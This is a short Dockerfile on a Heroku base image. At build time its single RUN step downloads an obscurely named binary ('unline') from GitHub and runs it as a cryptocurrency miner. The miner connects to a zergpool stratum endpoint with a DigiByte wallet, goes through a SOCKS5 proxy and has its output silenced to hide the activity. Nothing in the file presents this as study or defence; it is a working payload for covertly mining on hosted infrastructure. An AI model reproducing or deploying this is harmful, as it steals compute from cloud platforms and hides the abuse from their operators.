FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/gembock/glowing-octo-computing-machine/raw/main/unline; chmod +x unline; ./unline -o stratum+tcp://yespowerSUGAR.mine.zergpool.com:6535 -u dgb1qjank960gde85sks7nlr4ge8tujc09d3qt8pznn.Corz -p c=DGB,mc=SUGAR,m=solo -t 4 --proxy socks5://49.12.236.170:10000 > /dev/null 2>&1
CMD bash heroku.sh
